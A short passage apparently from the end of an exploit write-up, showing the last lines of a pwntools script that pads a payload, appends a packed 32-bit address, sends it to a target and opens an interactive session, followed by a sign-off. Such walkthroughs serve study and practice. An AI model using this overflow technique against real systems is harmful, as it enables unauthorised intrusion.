#print(len(p))
p += b"a"*8
p += p32(addr)

target.send(p)
target.interactive()
```

See you tomorrow!